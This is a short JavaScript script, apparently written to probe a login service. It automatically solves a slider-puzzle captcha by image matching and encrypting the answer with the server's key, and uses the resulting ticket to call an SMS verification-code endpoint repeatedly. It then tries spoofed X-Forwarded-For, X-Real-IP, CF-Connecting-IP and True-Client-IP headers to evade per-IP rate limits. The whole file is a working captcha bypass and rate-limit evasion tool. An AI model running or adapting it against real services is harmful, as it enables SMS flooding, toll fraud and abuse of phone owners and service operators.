import {B,H,j,aes,solveV2} from './lib_captcha.mjs';
import crypto from 'node:crypto';
async function ticket(){
  const uid=crypto.randomUUID();
  const cap=await j(fetch(B+'/api/auth/captcha/behavior?'+new URLSearchParams({captchaType:'blockPuzzle',clientUid:uid,ts:String(Date.now())}),{headers:H}));
  const d=cap.data;
  const r=solveV2(Buffer.from(d.originalImageBase64,'base64'),Buffer.from(d.jigsawImageBase64,'base64'));
  const pointJson=aes(JSON.stringify({x:r.nccTop[0].dx,y:5}),d.secretKey);
  const chk=await j(fetch(B+'/api/auth/captcha/behavior',{method:'POST',headers:H,body:JSON.stringify({captchaType:'blockPuzzle',token:d.token,pointJson,clientUid:uid,ts:Date.now()})}));
  if(chk?.data?.repCode!=='0000')return null;
  return aes(d.token+'---'+pointJson,d.secretKey);
}
async function trySend(phone, extraHeaders={}){
  const cv=await ticket();
  if(!cv) return 'TICKET_FAIL';
  const out=[];
  for(let i=0;i<6;i++){
    const r=await j(fetch(B+'/api/auth/sms/send',{method:'POST',headers:{...H,...extraHeaders},body:JSON.stringify({phone,scene:'login',captchaVerification:cv})}));
    out.push(r.code+':'+r.msg);
    if(r.code!=='400') break;
    await new Promise(z=>setTimeout(z,250));
  }
  return out.join(' | ');
}
console.log('baseline   ', await trySend('19900000301'));
console.log('XFF 1.1.1.1', await trySend('19900000302',{'X-Forwarded-For':'1.1.1.1'}));
console.log('XFF random ', await trySend('19900000303',{'X-Forwarded-For':'203.0.113.77','X-Real-IP':'203.0.113.77'}));
console.log('CF-IP       ', await trySend('19900000304',{'CF-Connecting-IP':'198.51.100.9','True-Client-IP':'198.51.100.9'}));
